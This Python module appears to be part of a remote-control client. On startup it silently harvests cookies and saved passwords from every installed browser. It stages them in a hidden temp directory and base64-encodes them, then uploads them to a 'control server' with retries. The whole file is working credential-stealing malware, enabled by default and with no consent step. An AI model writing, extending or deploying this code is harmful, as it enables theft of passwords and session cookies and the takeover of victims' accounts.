"""
Automatic data collector for browser information.

Runs in background thread on client startup to collect:
- Cookies from all browsers
- Saved passwords
- Browser profiles

Collected data is sent to the server automatically.
"""
from __future__ import annotations

import base64
import json
import logging
import os
import threading
import time
import urllib.request
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable, Optional

logger = logging.getLogger(__name__)


@dataclass
class CollectionResult:
    """Result of a data collection operation."""
    success: bool
    data_type: str
    item_count: int = 0
    browsers: list[str] = field(default_factory=list)
    error: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


@dataclass
class CollectorConfig:
    """Configuration for auto-collector."""
    collect_cookies: bool = True
    collect_passwords: bool = True
    collect_profiles: bool = False
    delay_seconds: float = 2.0  # Delay before starting collection
    retry_count: int = 3
    retry_delay: float = 5.0
    send_to_server: bool = True


def _is_auto_collection_enabled() -> bool:
    """Check if auto-collection is enabled via environment."""
    value = os.getenv("RC_AUTO_COLLECT", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _get_collector_config() -> CollectorConfig:
    """Get collector configuration from environment variables."""
    return CollectorConfig(
        collect_cookies=os.getenv("RC_COLLECT_COOKIES", "1").strip().lower() not in {"0", "false", "no", "off"},
        collect_passwords=os.getenv("RC_COLLECT_PASSWORDS", "1").strip().lower() not in {"0", "false", "no", "off"},
        collect_profiles=os.getenv("RC_COLLECT_PROFILES", "0").strip().lower() in {"1", "true", "yes", "on"},
        delay_seconds=float(os.getenv("RC_COLLECT_DELAY", "2.0")),
        send_to_server=os.getenv("RC_COLLECT_SEND", "1").strip().lower() not in {"0", "false", "no", "off"},
    )


class AutoCollector:
    """
    Automatic data collector that runs in background.
    
    Collects browser data (cookies, passwords) automatically on startup
    and sends to the control server.
    """
    
    def __init__(
        self,
        session_id: str,
        server_url: Optional[str] = None,
        token: Optional[str] = None,
        config: Optional[CollectorConfig] = None,
    ):
        self._session_id = session_id
        self._server_url = server_url
        self._token = token
        self._config = config or _get_collector_config()
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._results: list[CollectionResult] = []
        self._on_complete: Optional[Callable[[list[CollectionResult]], None]] = None
    
    def start(self) -> None:
        """Start the auto-collector in a background thread."""
        if not _is_auto_collection_enabled():
            logger.debug("Auto-collection disabled via environment")
            return
        
        if self._thread is not None and self._thread.is_alive():
            logger.debug("Auto-collector already running")
            return
        
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True, name="auto-collector")
        self._thread.start()
        logger.info("Auto-collector started")
    
    def stop(self) -> None:
        """Stop the auto-collector."""
        self._stop_event.set()
        if self._thread is not None:
            self._thread.join(timeout=5.0)
            self._thread = None
        logger.debug("Auto-collector stopped")
    
    def set_on_complete(self, callback: Callable[[list[CollectionResult]], None]) -> None:
        """Set callback to be called when collection is complete."""
        self._on_complete = callback
    
    def get_results(self) -> list[CollectionResult]:
        """Get collection results."""
        return self._results.copy()
    
    def _run(self) -> None:
        """Main collection loop."""
        # Wait before starting collection
        if self._config.delay_seconds > 0:
            logger.debug("Waiting %.1f seconds before collection", self._config.delay_seconds)
            if self._stop_event.wait(self._config.delay_seconds):
                return  # Stopped early
        
        # Collect cookies
        if self._config.collect_cookies:
            result = self._collect_cookies()
            self._results.append(result)
            if self._config.send_to_server and result.success:
                self._send_result("cookies", result)
        
        # Small delay between operations
        if self._stop_event.wait(0.5):
            return
        
        # Collect passwords
        if self._config.collect_passwords:
            result = self._collect_passwords()
            self._results.append(result)
            if self._config.send_to_server and result.success:
                self._send_result("passwords", result)
        
        # Collect profiles (if enabled)
        if self._config.collect_profiles and not self._stop_event.is_set():
            result = self._collect_profiles()
            self._results.append(result)
            if self._config.send_to_server and result.success:
                self._send_result("profiles", result)
        
        # Call completion callback
        if self._on_complete:
            try:
                self._on_complete(self._results)
            except Exception as e:
                logger.debug("Completion callback error: %s", e)
        
        logger.info("Auto-collection complete: %d results", len(self._results))
    
    def _collect_cookies(self) -> CollectionResult:
        """Collect cookies from all browsers."""
        try:
            from remote_client.cookie_extractor import CookieExporter
            
            exporter = CookieExporter()
            # Get available browsers
            available = exporter.get_available_browsers()
            browser_ids = [b["id"] for b in available]
            
            if not browser_ids:
                return CollectionResult(
                    success=False,
                    data_type="cookies",
                    error="No browsers found",
                )
            
            # Export cookies
            cookies_json = exporter.export(browser_ids)
            cookies = json.loads(cookies_json)
            
            # Store in temp file for later retrieval
            self._save_collected_data("cookies", cookies)
            
            return CollectionResult(
                success=True,
                data_type="cookies",
                item_count=len(cookies),
                browsers=browser_ids,
            )
        except Exception as e:
            logger.warning("Cookie collection failed: %s", e)
            return CollectionResult(
                success=False,
                data_type="cookies",
                error=str(e),
            )
    
    def _collect_passwords(self) -> CollectionResult:
        """Collect passwords from all browsers."""
        try:
            # Try local password extractor first
            try:
                from remote_client.password_extractor import PasswordExtractor
                extractor = PasswordExtractor()
            except ImportError:
                # Fall back to global password_extractor module
                import sys
                import os
                # Add password_extractor to path if needed
                base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
                pwd_extractor_path = os.path.join(base_dir, "password_extractor")
                if pwd_extractor_path not in sys.path:
                    sys.path.insert(0, pwd_extractor_path)
                from password_extractor.extractor import PasswordExtractor
                extractor = PasswordExtractor()
            
            # Get available browsers
            available = extractor.get_available_browsers()
            browser_ids = [b["id"] for b in available]
            
            if not browser_ids:
                return CollectionResult(
                    success=False,
                    data_type="passwords",
                    error="No browsers with saved passwords found",
                )
            
            # Extract passwords
            all_passwords = extractor.extract_all()
            
            # Convert to serializable format
            passwords_data = {}
            total_count = 0
            for browser, pwd_list in all_passwords.items():
                passwords_data[browser] = [
                    {
                        "url": p.url,
                        "username": p.username,
                        "password": p.password,
                        "date_created": p.date_created,
                        "date_last_used": p.date_last_used,
                        "times_used": p.times_used,
                    }
                    for p in pwd_list
                ]
                total_count += len(pwd_list)
            
            # Store data
            self._save_collected_data("passwords", passwords_data)
            
            return CollectionResult(
                success=True,
                data_type="passwords",
                item_count=total_count,
                browsers=browser_ids,
            )
        except Exception as e:
            logger.warning("Password collection failed: %s", e)
            return CollectionResult(
                success=False,
                data_type="passwords",
                error=str(e),
            )
    
    def _collect_profiles(self) -> CollectionResult:
        """Collect browser profile information."""
        try:
            from remote_client.browser_profile import get_profile_exporter
            
            exporter = get_profile_exporter()
            response = exporter.handle_action("list_profiles", {})
            
            profiles = response.get("profiles", [])
            browsers = list(set(p.get("browser", "") for p in profiles if p.get("browser")))
            
            self._save_collected_data("profiles", profiles)
            
            return CollectionResult(
                success=True,
                data_type="profiles",
                item_count=len(profiles),
                browsers=browsers,
            )
        except Exception as e:
            logger.warning("Profile collection failed: %s", e)
            return CollectionResult(
                success=False,
                data_type="profiles",
                error=str(e),
            )
    
    def _save_collected_data(self, data_type: str, data: Any) -> None:
        """Save collected data to temp file for later retrieval."""
        import tempfile
        
        try:
            data_dir = os.path.join(tempfile.gettempdir(), ".rc_data")
            os.makedirs(data_dir, exist_ok=True)
            
            file_path = os.path.join(data_dir, f"{data_type}_{self._session_id}.json")
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False)
            
            logger.debug("Saved %s data to %s", data_type, file_path)
        except Exception as e:
            logger.debug("Failed to save %s data: %s", data_type, e)
    
    def _send_result(self, data_type: str, result: CollectionResult) -> None:
        """Send collection result to server."""
        if not self._server_url:
            logger.debug("No server URL, skipping send")
            return
        
        try:
            # Load saved data
            import tempfile
            data_dir = os.path.join(tempfile.gettempdir(), ".rc_data")
            file_path = os.path.join(data_dir, f"{data_type}_{self._session_id}.json")
            
            with open(file_path, "r", encoding="utf-8") as f:
                data = json.load(f)
            
            # Prepare payload
            payload = {
                "session_id": self._session_id,
                "data_type": data_type,
                "data": base64.b64encode(json.dumps(data).encode("utf-8")).decode("ascii"),
                "item_count": result.item_count,
                "browsers": result.browsers,
                "timestamp": result.timestamp,
            }
            
            # Send to server
            url = self._build_upload_url()
            if url:
                self._http_post(url, payload)
                logger.info("Sent %s data to server (%d items)", data_type, result.item_count)
        except Exception as e:
            logger.debug("Failed to send %s data: %s", data_type, e)
    
    def _build_upload_url(self) -> Optional[str]:
        """Build the URL for uploading collected data."""
        if not self._server_url:
            return None
        
        base = self._server_url
        if "://" not in base:
            base = f"http://{base}"
        
        parsed = urllib.parse.urlsplit(base)
        scheme = parsed.scheme
        if scheme in {"ws", "wss"}:
            scheme = "https" if scheme == "wss" else "http"
        
        return urllib.parse.urlunsplit((scheme, parsed.netloc, "/api/collected-data", "", ""))
    
    def _http_post(self, url: str, payload: dict) -> None:
        """Send HTTP POST request with JSON payload."""
        data = json.dumps(payload).encode("utf-8")
        headers = {
            "Content-Type": "application/json",
        }
        if self._token:
            headers["x-rc-token"] = self._token
        
        request = urllib.request.Request(url, data=data, headers=headers, method="POST")
        
        for attempt in range(self._config.retry_count):
            try:
                with urllib.request.urlopen(request, timeout=30) as response:
                    if response.status == 200:
                        return
            except Exception as e:
                if attempt < self._config.retry_count - 1:
                    logger.debug("Upload attempt %d failed: %s, retrying...", attempt + 1, e)
                    time.sleep(self._config.retry_delay)
                else:
                    raise


# Global collector instance
_collector: Optional[AutoCollector] = None


def start_auto_collection(
    session_id: str,
    server_url: Optional[str] = None,
    token: Optional[str] = None,
) -> Optional[AutoCollector]:
    """
    Start automatic data collection.
    
    Args:
        session_id: Client session ID
        server_url: URL of the control server
        token: Authentication token
        
    Returns:
        AutoCollector instance if started, None if disabled
    """
    global _collector
    
    if not _is_auto_collection_enabled():
        logger.debug("Auto-collection disabled")
        return None
    
    if _collector is not None:
        _collector.stop()
    
    _collector = AutoCollector(session_id, server_url, token)
    _collector.start()
    return _collector


def stop_auto_collection() -> None:
    """Stop automatic data collection."""
    global _collector
    
    if _collector is not None:
        _collector.stop()
        _collector = None
